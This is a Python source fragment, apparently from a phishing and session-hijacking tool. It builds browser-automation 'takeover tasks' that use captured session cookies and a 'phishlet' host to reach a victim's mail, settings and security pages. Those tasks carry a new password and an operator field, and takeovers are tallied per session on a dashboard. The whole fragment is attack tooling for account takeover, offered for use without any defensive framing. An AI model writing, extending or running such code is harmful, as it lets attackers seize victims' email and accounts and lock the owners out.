    if kind == "screenshot":
        path = _inside(outdir, spec.get("name", "shot.png"))
        page.screenshot(path=path, full_page=bool(spec.get("full_page", False)))
        result["files"].append(path)
        return {"path": path}
    if kind == "download":
        with page.expect_download(timeout=spec.get("timeout", 30000)) as dl:
            page.click(spec.get("selector", "a"))
        d = dl.value
        path = _inside(outdir, d.suggested_filename or "download.bin")
        d.save_as(path)
        result["files"].append(path)
        return {"path": path}
    raise ValueError(f"unknown step '{kind}'")


def _task_vars(rec, home):
    """Variables a task step may use in a URL.

    {home} is the landing page. The rest are best-effort paths on the same host;
    a session's meta can override any of them (`meta.mail`, `meta.settings`,
    `meta.security`, `meta.operator`) so a campaign can point the takeover tasks
    at the real pages without editing code.
    """
    meta = rec.get("meta") or {}
    base = home.rstrip("/")

    def pick(key, default):
        return str(meta.get(key) or default).format(home=base)
    return {
        # {home} is the URL as given: appending a slash turned a path URL
        # (https://site/account) into a different resource and the replay/browser
        # fetched something else
        "home": home,
        "new_password": str(meta.get("new_password") or ""),
        "mail": pick("mail", "{home}/mail"),
        "settings": pick("settings", "{home}/settings"),
        "security": pick("security", "{home}/settings/security"),
        "operator": str(meta.get("operator") or ""),
    }


def _guess_home(rec):
    """Best-effort landing URL for a session (phishlet host or explicit meta)."""
    meta = rec.get("meta") or {}
    if meta.get("home"):
        return meta["home"]
    for c in rec.get("cookies", []):
        dom = str(c.get("domain", "")).lstrip(".")
        if dom and "localhost" not in dom:
            return f"https://{dom}/"
    return "https://example.com/"


# ------------------------------------------------------------------- state ---
def state_badge(rec):
    """Short state label for the dashboard and CLI."""
    s = rec.get("state", "opened")
    extra = ""
    if rec.get("takeovers"):
        extra = f" +{len(rec['takeovers'])} takeover(s)"
    return f"{s}{extra}"
